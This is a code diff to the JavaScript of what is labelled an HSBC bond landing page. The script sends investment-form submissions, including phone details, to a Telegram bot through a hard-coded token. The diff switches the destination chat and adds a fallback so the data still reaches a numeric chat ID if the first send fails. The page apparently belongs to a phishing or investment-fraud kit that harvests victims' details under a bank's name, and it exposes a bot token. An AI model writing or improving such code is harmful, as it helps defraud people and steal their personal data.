@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function() {
     
     const form = document.querySelector('.investment-form');
     const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
-    const CHAT_ID = '-1002416566645';
+    const CHAT_ID = '@Reciever_stock';
 
     // Phone validation function
     function isValidPhone(countryCode, phone) {
@@ -94,7 +94,8 @@ From: HSBC Capital Protected Bond Landing Page
         `;
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // First try to send to channel with @ format
+            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -106,7 +107,23 @@ From: HSBC Capital Protected Bond Landing Page
                 })
             });
 
-            const data = await response.json();
+            let data = await response.json();
+
+            // If first attempt fails, try with numeric ID
+            if (!data.ok) {
+                response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: '1002416566645',
+                        text: message,
+                        disable_web_page_preview: true
+                    })
+                });
+                data = await response.json();
+            }
 
             if (data.ok) {
                 form.reset();
